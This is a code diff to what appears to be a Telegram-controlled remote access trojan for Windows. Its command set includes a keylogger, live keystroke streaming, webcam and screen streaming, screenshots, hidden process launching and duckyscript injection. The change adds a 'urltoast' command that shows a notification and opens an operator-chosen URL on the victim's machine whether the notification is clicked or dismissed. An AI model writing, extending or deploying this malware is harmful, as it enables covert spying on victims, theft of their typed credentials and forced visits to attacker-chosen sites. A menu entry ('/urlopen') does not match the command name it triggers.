@@ -8,7 +8,7 @@ If you lose control of your telegram bot, you could potentially lose the control
 """
 
 
-__version__ = "2.12.2"
+__version__ = "2.12.4"
 
 
 #TELEGRAM
@@ -65,6 +65,7 @@ from io import BytesIO, StringIO
 from random import choice, randint
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
+from windows_toasts import Toast, WindowsToaster
 from subprocess import CREATE_NO_WINDOW, PIPE, Popen
 from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, rename
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
@@ -264,8 +265,8 @@ webcamstreamstart - Sets you a link to a webcam stream.
 screenstreamstart - Sets you a link to a screen stream.
 webcamstreamstop - Stops the webcam stream.
 screenstreamstop - Stops the screen stream.
-webcamandscreenstreamstart - Sets you a link to a webcam&screen stream.
-webcamandscreenstreamstop - Sops the webcam&screen strea
+webcamandscreenstreamstart - Sets you a link to a webcam and screen stream.
+webcamandscreenstreamstop - Stops the webcam and screen stream.
 
 🔊 Audio & Volume
 breath - Play breathing sound.
@@ -319,6 +320,7 @@ livekeylogger - Sends live updates about what's being typed on the keyboard.
 
 🦑 Misc
 plankton - Plankton.
+urltoast - Shows a url opening windows toast.
 planktonnoaudio - Plankton no audio.
 johnpork - John Pork.
 johnporknoaudio - John Prok no audio.
@@ -449,6 +451,9 @@ def get_current_wallpaper():
 def get_function_parameters(function: callable) -> list[str]:
     return function.__code__.co_varnames[:function.__code__.co_argcount]
 
+def get_required_params(func):
+    return func.__code__.co_varnames[:func.__code__.co_argcount][:func.__code__.co_argcount - len(func.__defaults__ or ())]
+
 def backup_wallpaper(backup_path):
     current_wallpaper = get_current_wallpaper()
     if exists(current_wallpaper):
@@ -485,6 +490,15 @@ def pad_to_16_9(image):
         padded = copyMakeBorder(image, 0, 0, pad, new_width - width - pad, BORDER_CONSTANT, value=(0, 0, 0))
     return padded
 
+def notify_toast(title: str, main_text: str, description: str, on_activated: Callable|None=None, on_dismissed: Callable|None=None, toaster:WindowsToaster|None=None) -> None:
+    if not toaster:
+        toaster = WindowsToaster(title)
+    toaster.show_toast(
+        Toast(
+            [main_text,
+             description], on_activated=on_activated, on_dismissed=on_dismissed
+        )
+    )
 
 def terminate_process_by_name(process_name: str) -> None:
     for proc in psutil.process_iter():
@@ -1205,6 +1219,7 @@ class PeppinoTelegram:
             "jumpscare":self.jumpscare,
             "keylogger":self.keylogger,
             "screenshot":self.screenshot,
+            "urltoast":self.browser_opening_toast,
             "messagebox":self.message_box,
             "waitforface":self.waitforface,
             "webcamclip":self.record_webcam,
@@ -1310,6 +1325,9 @@ class PeppinoTelegram:
 
     def breath(self) -> None:
         self.__play_loaded_sound("breath")
+
+    def browser_opening_toast(self, title: str, main_text: str, descritpion: str, url: str) -> None:
+        notify_toast(title, main_text, descritpion, on_activated=lambda: browseropen(url), on_dismissed=lambda: browseropen(url))
 
     def bsend(self, text: str, retries=0, parse_mode:str|None=None, reply_markup=None) -> int|None:
         if retries>3:
@@ -1759,6 +1777,7 @@ class PeppinoTelegram:
             "🦑 Plankton": "/plankton",
             "🔇 Planktonnoaudio": "/planktonnoaudio",
             "🐷 Johnpork": "/johnpork",
+            "🔔 Urlopen": "/urlopen",
             "🔕 Johnporknoaudio": "/johnporknoaudio",
             "🛋️ Gabinetti": "/gabinetti",
             "⌨️ Duckyscript": "/duckyscript",
@@ -1822,10 +1841,15 @@ class PeppinoTelegram:
 
         func = self.function_table.get(command)
         if func:
+            function_needed_args = get_required_params(func)[1:]
+            funciton_all_args = get_function_parameters(func)[1:]
             try:
                 if func in self.no_background_functions:
                     func(*function_args)
                 else:
+                    if len(function_args) < len(function_needed_args) or len(function_args) > len(funciton_all_args):
+                        print(f"{function_needed_args=}\n{funciton_all_args=}\n{function_args}")
+                        raise TypeError("Wrong number of arguments for this function")
                     if function_args:
                         thread_args = (*function_args,)
                         new_thread = Thread(target=func, args=thread_args)
@@ -1834,9 +1858,8 @@ class PeppinoTelegram:
                     new_thread.start()
             except TypeError as e:
                 #self.bsend(f"Invalid args for function {command}\n{e}")
-                function_args = get_function_parameters(func)
                 args = {} 
-                for arg in function_args:
+                for arg in function_needed_args:
                     if arg == "self":
                         continue
                     response = self.send_prompt(f"Choose a {arg} for {command}")
@@ -1901,7 +1924,7 @@ class PeppinoTelegram:
             self.bsend(f"Invalid command {command}")
 
 
-    def parse_document(self, msg: dict[str:str], mimetype: str="document", update_exe: bool=False) -> None:
+    def parse_document(self, msg: dict[str:str], mimetype: str="document") -> None:
         document = msg[mimetype]
         file_id = document["file_id"]
         saved_filename = randomname()
